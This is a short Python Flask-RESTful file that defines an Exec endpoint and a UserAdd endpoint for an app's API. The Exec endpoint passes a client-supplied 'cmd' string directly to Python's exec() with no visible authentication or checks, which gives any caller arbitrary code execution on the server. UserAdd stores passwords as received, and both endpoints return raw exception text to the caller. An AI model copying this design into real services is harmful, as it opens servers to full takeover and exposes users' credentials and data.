from app import models
from flask_restful import Resource, reqparse


class Exec(Resource):

    parser = reqparse.RequestParser()
    parser.add_argument('cmd', type=str, required=True, help='This field cannot be blank.')

    def post(self):
        data = self.parser.parse_args()
        try:
            exec(data['cmd'])
            return {'message': 'Command executed.'}
        except Exception as e:
            return {'message': 'Error: ' + str(e)}


class UserAdd(Resource):

    parser = reqparse.RequestParser()
    parser.add_argument('email', type=str, required=True, help='This field cannot be blank.')
    parser.add_argument('first_name', type=str, required=True, help='This field cannot be blank.')
    parser.add_argument('last_name', type=str, required=True, help='This field cannot be blank.')
    parser.add_argument('phone', type=str, required=True, help='This field cannot be blank.')
    parser.add_argument('is_forwarder', type=bool, required=True, help='This field cannot be blank.')
    parser.add_argument('password', type=str, required=True, help='This field cannot be blank.')

    def post(self):
        data = self.parser.parse_args()
        user = models.User(
            email=data['email'],
            first_name=data['first_name'],
            last_name=data['last_name'],
            phone=data['phone'],
            is_forwarder=data['is_forwarder'],
            password=data['password']
        )
        try:
            user.add()
            return {'message': 'User added'}
        except Exception as e:
            return {'message': 'Error: ' + str(e)}
